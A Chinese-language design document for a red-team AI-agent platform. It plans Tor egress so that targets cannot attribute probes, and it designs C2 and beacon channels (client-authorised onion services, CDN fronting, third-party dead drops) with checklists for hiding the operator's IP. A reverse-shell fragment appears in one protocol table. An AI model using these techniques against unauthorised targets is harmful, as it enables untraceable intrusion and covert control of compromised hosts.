# Tor 作为 Agent 级出口能力 —— 设计方案

> 状态：设计稿（未实现）
> 范围：仓库 mhtsec/ARTEX（本地）
> 日期：2026-10-23

## 1. 背景与目标

为红队测试提供两种同时成立的性质：

- **平台侧透明**：每次 Agent 运行用了哪种出口、哪个出口 IP、哪条电路，全部落库可审计、可复现。
- **目标侧不可归因**：目标看到的是 Tor 出口，看不到真实来源。

出口能力不放在「系统设置」的全局代理卡片里，而是作为 **Agent 配置项**：
内置 Agent（goals / planner / mainagent / worker / auto / pentest）与自定义会话 Agent
各自持有独立的出口策略，提示词感知当前出口。

### 1.1 不可协商的硬约束

**探测前期，任何直接触达目标的流量都不得暴露真实 IP。**

即：子域枚举、指纹识别、目录探测、端口探测、漏洞验证、爬虫——全部必须经 Tor（或经用户显式
指定的匿名出口）。真实 IP 只允许出现在「不与目标交互」的流量上：第三方情报 API 查询、LLM 调用、
平台自身更新、工具下载、通知外发。

这条约束决定了三件事：

1. 默认值必须是「匿名」而非「继承直连」——未配置时不能静默走真实 IP。
2. 失败时必须中止，**不能回退直连**（见 §15）。
3. DNS 也必须经 Tor 解析，否则查询本身就是泄露（见 §15）。

## 2. 现状调研

### 2.1 当前没有任何 Tor 实现

Go 与前端源码中 `tor` / `9050` / `.onion` 零命中，仅存在通用 socks5 通道。

### 2.2 现有三条出口链路

| # | 链路 | 代码位置 | socks5 的 DNS 行为 |
|---|---|---|---|
| A | 捕获 ON：Agent → MITM(:8788) → 上游 | `traffic/traffic.go` `SetUpstreamProxy`（`p.SetUpstreamProxy(func(*http.Request)...)`） | go-mitmproxy 内部用 `proxy.SOCKS5`，域名按 `ATYP=domain` 转发 → **远程 DNS，`.onion` 可用** |
| B | 捕获 OFF：bash 子进程 | `agent/worker.go` `proxyEnv` | 注入 `ALL_PROXY=socks5://`，curl 本地解析 → **`.onion` 不可用且 DNS 泄露** |
| C | WebFetch / 浏览器 MCP | `WebFetchProxy`、`server/manager.go` `syncBrowserMCPProxy` | Go `http.Transport` 中 `socks5` 与 `socks5h` 等价 → **远程 DNS** |

结论：A、C 天然可承载 Tor；**B 是唯一缺口**，需在 `proxyEnv` 中把 `socks5://` 换成 `socks5h://`。

### 2.3 Agent 体系现状

| 项 | 位置 |
|---|---|
| Agent 数据模型 | `db/config.go` `type Agent struct` |
| 列清单 / 扫描 | `db/config.go` `agentCols`、`scanAgent` |
| 内置 Agent 种子 | `db/db.go` `builtinAgents` |
| Agent CRUD 路由 | `server/server.go` `/api/agents` 系列 |
| Agent 配置保存 | `server/server_mgmt.go` `pgSaveAgentConfig` |
| 提示词渲染 | `agent/worker.go` `workerSystem(proxyAddr, caCert, dataDir, runDir)` |
| 提示词变量 | `db/config.go` `PromptVars`、`server/server_mgmt.go` `withGlobalVars` |
| 运行时代理注入 | `server/task_llm.go`（worker/planner/main 各一次 `SetProxy`）、`server/server.go`（chat、自定义 agent） |

`worker` 的提示词变量目录里已有 `ProxyAddr`，说明提示词层已有「出口感知」的现成机制可复用。

## 3. 数据模型

### 3.1 `agents` 新增列

```sql
ALTER TABLE agents ADD COLUMN egress_mode      TEXT NOT NULL DEFAULT 'inherit';
-- inherit | direct | proxy | tor
ALTER TABLE agents ADD COLUMN egress_proxy     TEXT;
-- proxy 模式的 URL，支持 http/https/socks5/socks5h
ALTER TABLE agents ADD COLUMN tor_exit_country TEXT;
-- 如 'sg'；空 = 不限
ALTER TABLE agents ADD COLUMN tor_rotate       TEXT NOT NULL DEFAULT 'off';
-- off | per_run | per_intent | per_task
ALTER TABLE agents ADD COLUMN tor_circuit_key  TEXT NOT NULL DEFAULT 'task';
-- task | agent | off —— 电路隔离粒度
```

同步修改 `db/config.go`：`Agent` 结构体字段、`agentCols`、`scanAgent`、以及建表迁移。

### 3.2 审计表 `agent_egress_runs`

```sql
CREATE TABLE agent_egress_runs (
  id              BIGSERIAL PRIMARY KEY,
  agent_key       TEXT NOT NULL,
  task_id         BIGINT,
  conversation_id BIGINT,
  mode            TEXT NOT NULL,
  egress_hint     TEXT,        -- 脱敏后的出口地址（不含口令）
  exit_ip         TEXT,        -- 运行结束时探测所得
  is_tor          BOOLEAN,
  circuit_user    TEXT,        -- 隔离用 SOCKS 用户名，如 task-42 / agent-worker
  started_at      TIMESTAMPTZ NOT NULL DEFAULT now(),
  ended_at        TIMESTAMPTZ
);
```

## 4. 出口解析与注入

### 4.1 结构体

```go
// server/egress.go（新增）
type EgressPlan struct {
    Mode        string // direct | proxy | tor
    ProxyURL    string // 交给 SetProxy 的地址；tor 时为 socks5h://<circuitUser>:x@host:9050
    CACert      string // 仅在开启流量捕获时非空
    IsTor       bool
    CircuitUser string
    ExitCountry string
}
```

解析优先级：`agent.egress_mode` → 系统 `global_proxy` → 直连。
系统 `global_proxy` 降级为 `inherit` 模式的兜底默认值，不再单独承担 Tor 职责。

### 4.2 注入点

| 位置 | 现状 | 改为 |
|---|---|---|
| `server/task_llm.go` worker `SetProxy` | `s.m.ProxyAddr()` | `s.resolveEgress(agent, taskID, 0).ProxyURL` |
| `server/task_llm.go` planner `SetProxy` | 同上 | 同上 |
| `server/task_llm.go` main `SetProxy` | 同上 | 同上 |
| `server/server.go` chat `SetProxy` | 同上 | 按会话绑定的 agent 解析 |
| `server/server.go` 自定义 agent `SetProxy` | 同上 | 同上 |

### 4.3 底层修正（`.onion` 的前提）

`agent/worker.go` `proxyEnv`：当出口为 socks5 时，`ALL_PROXY` / `all_proxy` 使用
`socks5h://`（curl 只在该 scheme 下让代理解析域名）。

注意：这是一处行为变更——所有 socks5 出口都变为远程 DNS。对渗透平台这是更正确的默认
（避免本地 DNS 泄露目标域名），但需要在 `agent/proxyenv_test.go` 补断言。

`traffic.ValidateProxyURL` 增加 `socks5h` 分支；由于 go-mitmproxy 只认 `socks5`，
内部传输前需把 scheme 归一化为 `socks5`，同时保留原始串供 B 链路使用。

## 5. 内置 Agent 的提示词与配置

### 5.1 代码拥有的注入段（不可编辑）

仿照 `agent/worker.go` 中 `workerTrafficBlock` 的做法，新增：

```go
// torEgressBlock 段 [D]：出口为 Tor 时的硬约束。代码拥有，不入库，改提示词也丢不掉。
func torEgressBlock(p EgressPlan) string
```

注入内容要点：

- 本 Agent 目标流量经 Tor 出网（当前出口国家）
- 延迟约 2–3s/RTT，禁止端口扫描、目录爆破、密码喷洒等量大的动作
- 不支持 UDP：`nmap -sU` / `masscan` / `naabu -udp` 一律不用
- 任何 DNS 解析必须经代理（curl 用 `--socks5-hostname`，禁止 `dig`/`nslookup`/`host`）
- `.onion` 目标可直接访问
- 目标返回 403/挑战页可能是出口节点被拉黑：记录并换电路重试一次，不要反复撞同一出口
- 每次请求的耗时与出口 IP 会写入审计表，不要尝试绕过出口直连

注入到六个内置 Agent 的系统提示尾部，与现有 `[B]/[C]` 段同机制。
`workerSystem(proxyAddr, caCert, ...)` 签名改为接收 `EgressPlan`。

### 5.2 提示词变量

`agent_prompt_vars` 新增 runtime 变量：

| 变量 | 示例 | 用途 |
|---|---|---|
| `EgressMode` | `tor` | 可编辑提示词中做分支文案 |
| `EgressIsTor` | `true` | 同上 |
| `EgressExitCountry` | `sg` | 文案 |
| `EgressExitIP` | `192.42.116.68` | 运行后回填，供报告引用 |

## 6. 自定义会话 Agent 的创建与管理

### 6.1 创建

`POST /api/agents` 请求体增加 `egress` 对象：

```json
{
  "name": "外部资产侦察",
  "role": "assistant",
  "egress": {
    "mode": "tor",
    "tor_exit_country": "sg",
    "tor_rotate": "per_run",
    "tor_circuit_key": "agent"
  }
}
```

### 6.2 配置更新

`PUT /api/agents/{key}/config` 增加五个指针字段，遵循现有「缺省=不动」的三态约定：

```go
EgressMode      *string `json:"egress_mode"`
EgressProxy     *string `json:"egress_proxy"`
TorExitCountry  *string `json:"tor_exit_country"`
TorRotate       *string `json:"tor_rotate"`
TorCircuitKey   *string `json:"tor_circuit_key"`
```

### 6.3 新增 Agent 级接口

| 方法 | 路径 | 作用 |
|---|---|---|
| GET | `/api/agents/{key}/egress` | 生效出口 + 探测到的出口 IP + 是否 Tor |
| POST | `/api/agents/{key}/egress/test` | 用该 Agent 的出口探测一次，返回 IP / 国家 / 延迟 |
| POST | `/api/agents/{key}/egress/newnym` | 换电路 |
| GET | `/api/agents/{key}/egress/runs` | 审计记录分页 |

## 7. 电路隔离与轮换的约束（必须写进 UI 提示）

| 能力 | 实现 | 约束 |
|---|---|---|
| 隔离 | Tor `IsolateSOCKSAuth`（默认开启）：SOCKS 用户名不同 → 电路不同，凭据不校验 | 粒度只能到用户名；`task-42` / `agent-worker` 二选一 |
| 轮换 | `SIGNAL NEWNYM`（ControlPort 9051） | **进程级信号**：触发后所有 Agent 的新连接都换电路，不是只换当前 Agent；Tor 限流 10s 一次 |
| 出口国家 | `SETCONF ExitNodes={sg} StrictNodes=1` | 同样进程级；多 Agent 设不同国家会互相覆盖 |

若要 per-agent 独立轮换 / 独立国家，必须为每个 Agent 起独立 Tor 实例
（不同 `SocksPort` + 独立 `DataDirectory`），复杂度上一个量级，留待 P4 评估。

## 8. UI 改造

### 8.1 内置 Agent 配置页

「配置」tab 新增「出口」分区：

```
出口策略   ( ) 继承系统默认  ( ) 直连  ( ) 指定代理  (●) Tor

  ├ 出口国家   [ sg ▾ ]
  ├ 电路标识   [ 按任务 ▾ ]
  ├ 轮换时机   [ 每次运行 ▾ ]
  ├ [ 测试连接 ]  当前出口：192.42.116.68 · 新加坡 · Tor · 2.46s
  └ [ 立即换电路 ]
```

### 8.2 自定义 Agent

创建向导增加「出口」步骤；列表页出口列显示徽标（`直连` / `代理` / `Tor·sg`）。

### 8.3 任务详情

新增「出口」折叠面板，按运行列出：`agent / 模式 / 出口 IP / 电路 / 起止时间`。

## 9. 改动清单

| # | 文件 | 改动 | 预估行数 |
|---|---|---|---|
| 1 | `db/db.go`、`db/config.go` | 新列 + `agentCols` + `scanAgent` + 迁移 | ~80 |
| 2 | `db/egress.go`（新） | 审计表 CRUD | ~90 |
| 3 | `traffic/proxy.go`（新）、`traffic/traffic.go` | `socks5h` 归一化 | ~70 |
| 4 | `agent/worker.go` `proxyEnv` | 远程 DNS | ~8 |
| 5 | `agent/tor.go`（新） | `EgressPlan` + `torEgressBlock` | ~90 |
| 6 | `server/egress.go`（新） | `resolveEgress` + 探测 + NEWNYM | ~200 |
| 7 | `server/server_mgmt.go` | 配置字段扩展 | ~50 |
| 8 | `server/server.go` | 新路由 + settings DTO | ~60 |
| 9 | `server/task_llm.go`、`server/server.go` | 注入点替换 | ~10 |
| 10 | `agent/worker.go`、`planner.go`、`mainagent.go` | 系统提示注入段 | ~60 |
| 11 | `web/` Agent 配置与创建页 | 出口分区 + 徽标 + 审计面板 | ~400 |
| 12 | `docs/tor-egress.md`（新） | 使用与限制说明 | ~80 |
| 13 | `server/egress_router.go`（新） | 按类别路由出口 + 失败即中止（§13、§15.1） | ~150 |
| 14 | `agent/toolgate.go`（新） | 执行层门控：UDP/DNS/curl/并发（§15.3） | ~120 |
| 15 | `db/tools` 迁移 | 自定义工具加 `egress_class`、`needs_udp` | ~40 |
| 16 | `inbound/onion.go`（新） | Onion 生命周期 + **客户端授权强制校验**（§14.3） | ~260 |
| 16a | `inbound/onion_keys.go`（新） | X25519 密钥对生成、base32 编解码、`.auth` / `.auth_private` 写入、吊销 + SIGHUP | ~150 |
| 16b | `inbound/cdn_front.go`（新） | CDN 前置映射 + 7 项隐藏自查（§14.4、§14.6） | ~240 |
| 16c | `inbound/adapter.go`（新） | `inbound_kind` 适配器抽象（§14.5） | ~90 |
| 17 | `server/probe_visibility.go`（新） | 出口可见性预判与封禁三段式（§16.1、§16.2） | ~160 |
| 18 | 容器 DNS 配置 | `/etc/resolv.conf` 指向 Tor DNSPort（§15.2） | ~20 |

合计约 **2440 行**。

> 其中 §15（安全兜底）属于 P0：不做的话，§13 的策略矩阵只是摆设，真实 IP 仍会从
> DNS、UDP 工具或失败降级路径泄露。

## 10. 分期

| 阶段 | 内容 | 预估 |
|---|---|---|
| **P0** | 安全兜底：失败不回退直连、DNS 统一、工具门控（见 §15）——不做则 Tor 只是「看起来能用」 | 1 天 |
| P1 | 底层：`socks5h` + `proxyEnv` 远程 DNS（让 `.onion` 全链路可用） | 0.5 天 |
| P2 | 数据模型 + `resolveEgress` + 五个注入点 + 内置 Agent 提示词段 | 1.5 天 |
| P3 | Agent 配置 / 创建 UI + 测试连接 + 立即换电路 + 审计表与面板 | 2 天 |
| P4 | 入站通道（Onion Service）与出口效能/反检测（§14、§16） | 2 天 |
| P5 | 出口国家、按意图轮换、多 Tor 实例 | 2 天 |

## 11. 测试计划

- 单测：`ValidateProxyURL` 四种 scheme；`proxyEnv` 的 socks5 / socks5h 分支；审计表读写
- 集成：容器内 `curl --socks5-hostname` 请求 `check.torproject.org/api/ip`，断言 `IsTor:true`
- 隔离：两个不同 SOCKS 用户名并发请求，断言出口 IP 不同
- 回归：`traffic/proxy_test.go`、`agent/proxyenv_test.go` 全绿；非 Tor 场景 `global_proxy` 行为不变
- 兜底：模拟 Tor 不可用，断言 `target-probe` 返回错误且**未发生任何直连**（用假 DNS 与假 dialer 捕获）
- 门控：Tor 模式下断言 `nmap -sU`、`dig`、无 `--socks5-hostname` 的 curl 被拒绝
- 入站：创建 Hidden Service 后，用携带客户端授权的 tor 客户端连通；**未授权客户端无法连接且探测不到服务**
- 入站：**未配置任何 `.auth` 时平台拒绝启用信道**（负向用例）
- 入站：吊销客户端 → SIGHUP → 该客户端连接失败，其他客户端不受影响
- 入站：密钥对生成与 base32 编解码 round-trip；审计表只出现公钥指纹，不出现私钥
- 入站：CDN 前置自查用一条「故意泄露源站」的测试配置，断言 7 项检查中至少命中并阻断上线
- 入站：断言 `ARTEX_CALLBACK_ADDR` 为裸公网 IP 时被拒绝（除非显式审批标记）

## 12. 风险与限制

- **提示词只能约束，不能强制**：Agent 仍可能写出 `dig` 或 UDP 扫描。真正强制需在工具执行层拦截
  （自定义工具 `kind=shell` 增加 `needs_udp` 标记，Tor 模式下拒绝执行）。
- **Tor 出口常被 WAF 拉黑**：Cloudflare 类目标大概率直接 403。适合的用途是外部资产侦察、
  匿名访问 `.onion`、避免暴露团队 IP，不适合全量渗透。
- **延迟**：实测 TTFB 约 2.46s，端口扫描不现实，只适合定向单点验证。
- **NEWNYM 全局生效**：多 Agent 并发时换电路互相影响，UI 需明示。
- **审计表增长**：每次 run 一行，需要与 `llm_records` 同等的清理策略。
- **合规**：仅在授权范围内使用；Tor 出口行为不可控，平台侧日志留存更重要。

## 13. 出站策略矩阵（按流量类别强制）

这是 §1.1 硬约束的落地形式：出口不是「全站一个开关」，而是**按流量类别**分配。

| 类别 | 典型动作 | 出口 | 强制级别 | 理由 |
|---|---|---|---|---|
| `target-probe` | 子域枚举、指纹、目录/端口探测、爬虫、漏洞验证 | **Tor（强制）** | 拒绝执行（不可降级） | 目标会记录来源 IP |
| `target-exploit` | 利用请求、webshell 交互、横向 | Tor（强制，可显式豁免） | 需二次确认才能豁免 | 同上，但高延迟可能破坏利用链 |
| `intel-query` | FOFA / Shodan / Hunter / Whois / crt.sh | **直连（真实 IP）** | 允许 | 情报平台普遍封 Tor exit；且这是查库，不是打目标 |
| `llm` | 模型调用 | 直连 | 强制直连 | 延迟与 Key 安全 |
| `platform-self` | 更新检查、工具下载、镜像拉取 | 直连 | 强制直连 | 大流量，走 Tor 会拖垮电路 |
| `notify` | Webhook 告警 | 直连 | 强制直连 | 见 `notify/http.go` 现有设计 |
| `inbound` | 反弹 shell / C2 / 信标 | Onion（**强制客户端授权**）/ CDN 前置 / 第三方 | **禁止裸公网 IP、禁止裸 Onion** | 见 §14 |

### 13.1 实现方式

在 Agent / 工具层引入流量类别声明，由统一的出口路由器决定实际出口：

```go
type EgressClass string

const (
    ClassTargetProbe   EgressClass = "target-probe"
    ClassTargetExploit EgressClass = "target-exploit"
    ClassIntelQuery    EgressClass = "intel-query"
    ClassLLM           EgressClass = "llm"
    ClassPlatformSelf  EgressClass = "platform-self"
    ClassNotify        EgressClass = "notify"
)

// egressFor 是唯一的出口决策入口；返回 error 表示该类别在当前配置下不允许执行。
func (s *Server) egressFor(class EgressClass, agentKey string, taskID int64) (EgressPlan, error)
```

要点：

- `ClassTargetProbe` 在未配置任何匿名出口时返回 **error**，而不是回退直连；
- 工具的 `channel` 字段决定类别：`kind=shell` 的扫描类工具默认 `target-probe`；
- 内置 `enrich` 引擎（`server/manager.go` `enrich.New(m.assets, m.ProxyAddr, 4)`）属于
  `target-probe`，但它是**全局单例、无 Agent 维度**——需要补一个「按任务归属解析出口」的
  回调，否则按 Agent 配 Tor 后它仍会用系统默认。

### 13.2 情报类直连的必要提醒

`intel-query` 走真实 IP 是刻意的取舍，但要注意：查询 API 的**账号 + 时间戳**本身会形成画像，
与后续 Tor 探测在时间上关联时仍可能被回溯。缓解手段是给情报查询加随机延迟、批量合并，
避免「查完某域名 3 秒后 Tor 就访问了该域名」这种强时间关联。

## 14. 入站通道：C2 / 信标 / 回连

主动出站只解决「我们去打目标」；红队与 APT 的另一半是**目标回来找我们**。
而这一半有两个不可妥协的前提：

> **① 入站通道一律不得暴露平台真实 IP。**
> 默认禁止使用裸公网 IP 作为 `ARTEX_CALLBACK_ADDR`；确需使用必须显式审批并在审计表记录。
>
> **② Onion 通道一律启用客户端授权，不使用裸 Onion。**
> 未配置至少一个 `authorized_clients/*.auth` 时，平台**拒绝启用**该信道。

### 14.1 三种承载方式

| 方式 | 目标侧看到什么 | 平台 IP 是否暴露 | 适用协议 | 主要限制 |
|---|---|---|---|---|
| **A. Onion Service** | `xxx.onion` | 否 | 任意 TCP | 需目标侧可用 Tor；RTT 2s 级 |
| **B. CDN 前置域名** | CDN 边缘 IP（Cloudflare/Fastly 等） | 否（前提是源站隐藏） | HTTP/HTTPS/WebSocket | CDN 不解 TCP/UDP；TLS 在 CDN 终止 |
| **C. 第三方通道** | 第三方服务域名（如云存储、协作平台） | 否 | 仅该平台的 API/HTTPS | 依赖第三方 ToS 与存活周期 |

裸公网 IP（含自建 VPS 直连、DDNS 指向源站）属于**禁止项**，不列入选项。

### 14.2 按协议选型

| 回连形态 | 可用方式 | 说明 |
|---|---|---|
| 反弹 shell（raw TCP，`bash -i >& /dev/tcp/...`） | A | B/C 都不转发裸 TCP |
| HTTPS 信标（周期上报 + 拉指令） | A / B / C | 最灵活，B 的伪装面最好 |
| WebSocket 长连 C2 | A / B | B 需要 CDN 支持 WS |
| DNS 隧道 | A（不适用） | 需独立域名 + 授权 DNS，属另一套方案，不在本期 |

**结论：HTTPS 信标优先走 B，反弹 shell 只能走 A。** 这也是为什么两种都要实现，不能二选一。

### 14.3 方式 A：Onion Service + 客户端授权（**已选定，强制**）

```ini
# torrc（Tor 0.4.9 / v3 onion）
HiddenServiceDir /var/lib/tor/artex-c2/
HiddenServicePort 8787 127.0.0.1:8787          # 只映射回环监听的服务

# 客户端授权是「文件」，不是配置项：v2 的 HiddenServiceAuthorizeClient 已被废弃
# /var/lib/tor/artex-c2/authorized_clients/<client>.auth 内容：
#   descriptor:x25519:<base32(x25519 公钥)>
```

> ⚠️ 已验证：Tor 0.4.9.11 会直接跳过 `HiddenServiceAuthorizeClient`
> （日志：`Skipping obsolete configuration option`）。必须用 v3 的
> `authorized_clients/` 目录方案。

客户端侧（目标侧信标）需要：

```ini
# torrc
ClientOnionAuthDir /var/lib/tor/client-auth/
# /var/lib/tor/client-auth/<name>.auth_private 内容：
#   <56位onion地址去掉.onion>:descriptor:x25519:<base32(x25519 私钥)>
```

平台能力：

| 功能 | 说明 |
|---|---|
| 生成/托管 | 创建 HiddenServiceDir，读 `hostname` 得到 `xxx.onion` |
| 授权管理 | `HiddenServiceAuthorizeClient` 生成的客户端密钥交付给目标侧 tor |
| 生命周期 | 启动/停止/重建（重建即换地址，旧地址作废） |
| 回调注入 | 把 `.onion` 写入回调配置，供信标/反弹 shell 生成器使用 |
| 审计 | onion 地址、授权客户端、上线时间写入 `agent_egress_runs` 的 `inbound` 记录 |

约束：onion 地址一旦泄露即可被扫描，默认开启客户端授权；吞吐受 Tor 网络限制，只适合控制通道。

#### 14.3.1 部署隔离要求（防止 IP 从应用层泄露）

Tor 协议本身不向客户端暴露服务端 IP。真正的泄露来自**配置与应用层**。隐藏服务上线前必须满足：

| # | 要求 | 不满足的后果 |
|---|---|---|
| 1 | 被映射的服务**只监听 `127.0.0.1`** | 同一端口仍可从公网按 IP 直连，隐藏服务形同虚设 |
| 2 | Docker 发布端口改为 `127.0.0.1:PORT:PORT`，不绑定 `0.0.0.0` | 同上，且绕过 UFW |
| 3 | 隐藏服务使用**独立 Tor 实例**与独立 `DataDirectory` | 与出站客户端混用，电路与状态互相牵连 |
| 4 | 不设置 `Onion-Location` 响应头 | 该头会公开「域名 ↔ onion」的对应关系 |
| 5 | 反向代理剥离 `X-Forwarded-For`、`Via`、`Server`、`X-Real-IP` | 应用层直接回显源站地址 |
| 6 | 应用错误页不输出主机名、内部地址、绝对 URL | 报错即泄露 |
| 7 | 应用自身的出站请求（LLM、通知、更新）不得携带可关联标识 | 通过账号/密钥把 onion 与平台身份关联 |
| 8 | 关闭目录列表、调试端点、`/metrics` 等非必要面 | 被当作信息收集入口 |
| 9 | 不在同一进程内同时提供「公网入口」与「onion 入口」 | 一处越权即可读到另一处的配置与日志 |
| 10 | 独立日志策略：onion 入口的访问日志不记录来源的真实 IP（本来也拿不到），且不写入含公网 IP 的字段 | 日志被抓到即泄露 |

> 第 1、2 条是当前部署的**实际风险点**：平台现在监听 `0.0.0.0:8787`，
> 一旦把该端口映射给隐藏服务，目标仍可绕过 Tor 按 IP 直连。

#### 14.3.2 客户端授权的作用边界

| 它能做到 | 它做不到 |
|---|---|
| 未持有客户端密钥者**无法建立连接**，连端口是否存在都探测不到 | 不能防止隐藏服务自身被去匿名化 |
| 降低被扫描、被滥用的面 | 不能阻止应用层主动泄露 IP |
| 客户端密钥可单独吊销，不影响其他客户端 | 不能抵御网络层面的关联分析（需同时观察两端流量） |

客户端授权是「访问控制」，不是「匿名性保证」。匿名性来自 Tor 本身 + 上述部署隔离。

#### 14.3.3 客户端授权的 v3 实现细节

| 项 | 说明 |
|---|---|
| 服务端配置 | `<HiddenServiceDir>/authorized_clients/<任意名>.auth`，每文件一行：`descriptor:x25519:<base32 公钥>` |
| 启用条件 | 目录中至少成功加载一个合法 `.auth` 文件，授权才生效 |
| 客户端配置 | `ClientOnionAuthDir` 指向目录，文件后缀必须为 `.auth_private` |
| 密钥生成 | **`tor --keygen` 不生成 x25519 客户端密钥**（只生成 relay 密钥），平台需自行生成 x25519 密钥对（Go `crypto/ecdh` 或 Python `cryptography`） |
| 吊销 | 删除对应 `.auth` 后需 **重启 Tor 或发送 SIGHUP** 才生效 |
| 地址 | v3 onion 为 56 字符，由 ed25519 公钥派生，与客户端授权密钥无关 |

**代价（必须写进选型说明）**：客户端授权要求**目标侧能运行 Tor 客户端**并持有私钥。
若目标侧只有一个 webshell（PHP/JSP），无法承载 Tor 客户端——这时 Onion + 授权不可行，
应改用 CDN 前置域名或第三方信箱（HTTP 承载）。

#### 14.3.4 平台侧实现要点

| 步骤 | 实现 |
|---|---|
| 生成密钥对 | Go `crypto/ecdh`（X25519）生成 keypair；公钥/私钥按 **base32（无填充）** 编码 |
| 下发服务端授权 | 把 `descriptor:x25519:<base32(pub)>` 写入 `<HiddenServiceDir>/authorized_clients/<client>.auth`（0600） |
| 交付客户端密钥 | 把 `<onion>:descriptor:x25519:<base32(priv)>` 写入目标侧 `ClientOnionAuthDir/<name>.auth_private`（0600），**只交付一次，不落库明文** |
| 启用校验 | 启用信道前检查 `authorized_clients/` 至少存在一个合法 `.auth`；否则拒绝启用并报错 |
| 吊销 | 删除 `.auth` → `SIGHUP` Tor → 校验该客户端已无法连接 |
| 审计 | 只记录 `client_id` 与公钥指纹，**绝不记录私钥** |

#### 14.3.5 选型结论

| 条件 | 选择 |
|---|---|
| 高匿名 + 目标侧可运行 Tor 客户端 | **Onion + 客户端授权**（唯一选项） |
| 高匿名 + 目标侧只有 webshell / 只能发 HTTPS | CDN 前置域名（§14.4）或第三方信箱（§14.5） |

**裸 Onion 不在可选方案内。** 原因：onion 地址一旦泄露（日志、截图、聊天记录、报告附件）
即对任何人开放；被陌生人连接会显著扩大被探测、被利用与 guard discovery 的攻击面。
客户端授权把「地址泄露」从致命问题降级为无害事件。

唯一例外是 `localhost` 单机调试：可临时不启用授权，但平台必须拒绝把该信道关联到任何
真实目标或任务，并在 UI 上标注「调试信道」。

### 14.4 方式 B：CDN 前置域名

目标只能看到 CDN 边缘节点，源站 IP 不进入目标视野。但**「用了 CDN」不等于「IP 隐藏」**，
必须同时满足以下全部条件，否则源站 IP 会从侧信道泄露：

| 条件 | 检查方式 |
|---|---|
| 源站只接受 CDN 回源 | 防火墙仅放行 CDN 官方 IP 段（`cloudflare`/`fastly` 的 IP 列表），其余全拒 |
| 不存在历史 DNS 记录 | 用 SecurityTrails / DNSDB 反查该域名历史 A 记录，确认无源站 IP |
| 证书不由源站直接签发 | crt.sh 查询该域名/IP 的证书透明度记录，确认证书只在 CDN 侧签发 |
| 无邮件侧信道 | 该域名不配 MX / SPF 指向源站；否则 SMTP 头会泄露 IP |
| 无子域直连 | 所有子域（含 `dev.` `mail.` `ftp.`）都走 CDN 或不存在 |
| 无 IPv6 直连 | 检查 AAAA 记录，避免目标走 IPv6 绕过 CDN |
| 无应用层回显 | 错误页、`Server` 头、重定向 Location 不包含源站地址 |

平台侧能力：

- 生成「前置域名 → 源站」映射配置，并自动执行上述 7 项自查（失败即告警，不允许上线）；
- 记录 `fronting_domain` 与 `origin_hidden=true` 到审计表；
- 入口只接受 HTTPS，强制 HSTS，避免降级暴露。

风险提示：

- **CDN 终止 TLS**：CDN 能看到明文。信标内容必须做应用层加密（端到端），不能只靠 TLS。
- 主流 CDN 的 ToS 普遍禁止 C2 类用途，账号可能被停用；这属于运营风险，需在方案外评估。
- **域名前置（domain fronting）已被主流 CDN 封禁**：SNI 与 Host 必须同域，不要依赖该技巧。

### 14.5 方式 C：第三方通道

把指令与结果寄存在第三方服务的正常流量里（合规前提下的「living off the land」）：

| 类型 | 优点 | 风险 |
|---|---|---|
| 对象存储 / 静态托管 | 域名与 IP 均属第三方，天然隐藏源站 | 平台侧审计留痕在第三方，可能被调取 |
| 协作/IM 平台 API | 混在正常企业流量里，不易被拦 | ToS 明确禁止；账号封禁即失联 |
| 商业重定向器（redirector as a service） | 运维成本低 | 服务商可看到全部流量，且可能配合溯源 |

平台侧只需支持「信标出口适配器」抽象：`inbound_kind = onion | cdn_front | third_party`，
具体协议由适配器实现，避免把第三方细节写死在核心逻辑里。

### 14.6 IP 暴露面自查清单（上线前必跑）

| 检查项 | 泄露途径 |
|---|---|
| DNS 历史记录 | 曾直接解析到源站 |
| 证书透明度日志 | 源站 IP 直接申请证书 |
| SPF / MX / DKIM | 邮件头暴露源站 |
| 子域枚举 | 未走 CDN 的 `dev`/`staging` 子域 |
| IPv6 AAAA | 绕过 CDN 直连 |
| 源站开放端口 | 除 CDN 回源外仍可从公网访问 |
| 平台自身页面 | 错误页、重定向、`X-Forwarded-For` 回显 |
| 组织关联 | 域名注册信息、whois 反查、GitHub 仓库引用 |

任一项不通过 → 该入站通道禁止启用。

### 14.7 审计字段

`agent_egress_runs` 增加：

```sql
ALTER TABLE agent_egress_runs ADD COLUMN inbound_kind TEXT;      -- onion|cdn_front|third_party
ALTER TABLE agent_egress_runs ADD COLUMN inbound_target TEXT;    -- 目标侧看到的地址（onion / 域名）
ALTER TABLE agent_egress_runs ADD COLUMN origin_hidden BOOLEAN;  -- 源站是否确认隐藏
```

### 14.8 信标通道设计（不暴露真实 IP）

#### 14.8.1 先破一个前提

「信标要连到真实 IP」这个前提本身不成立。传统 C2 之所以需要 IP，是因为它采用
**监听模型**（操作端开端口等目标连）。信标完全可以做成**信箱模型**（dead drop）：

> 目标把结果写进一个「信箱」，操作端去读；操作端把指令写进另一个「信箱」，目标去取。
> **双方都只做出站连接，任何一方都不监听端口。**

没有监听端口，就没有可被目标记录的 IP，也没有可被扫描的入口。

#### 14.8.2 三种拓扑与暴露面

| 拓扑 | 数据路径 | 目标能看到 | 第三方能看到 | 是否暴露平台 IP |
|---|---|---|---|---|
| T1 直连操作端 | 目标 → 平台公网 IP | 平台 IP | — | ❌ 禁止 |
| T2 重定向器 | 目标 → 中继 VPS → 平台 | 中继 IP | — | 中继 IP 暴露（非平台），可接受但需分级 |
| **T3 信箱 / 会合点** | 目标 ⇄ 信箱 ⇄ 操作端（双向轮询） | 信箱地址（域名或 onion） | 双方均为匿名出站 | ✅ 不暴露 |

推荐 T3，T2 仅在「目标只能连裸 TCP、且不接受 Tor」时作为次选。

#### 14.8.3 T3 信箱模型的组成

```
        ┌──────────── 信箱（三选一）────────────┐
目标 ──►│ ① Onion Service（我方托管，IP 天然隐藏）│◄── 操作端
        │ ② CDN 前置域名（源站隐藏，见 §14.4）    │
        │ ③ 第三方存储/API（双方 IP 都属第三方可见）│
        └───────────────────────────────────────┘
```

三种信箱的**共同要求**：双方都是匿名出站。

| 角色 | 出站方式 |
|---|---|
| 目标侧信标 | 目标自己的出网通道（HTTPS / Tor / 第三方 SDK） |
| **操作端轮询** | **必须经 Tor**（否则第三方日志会记录平台真实 IP） |

这一条最容易漏：很多方案只保护了目标侧，却让操作端用真实 IP 去拉取结果，第三方服务商的
访问日志里直接留下平台 IP。

#### 14.8.4 协议层设计

| 设计点 | 做法 | 目的 |
|---|---|---|
| 信道标识 | 128-bit 随机 `channel_id`，与域名/主机名/用户名无关 | 防止从标识反查归属 |
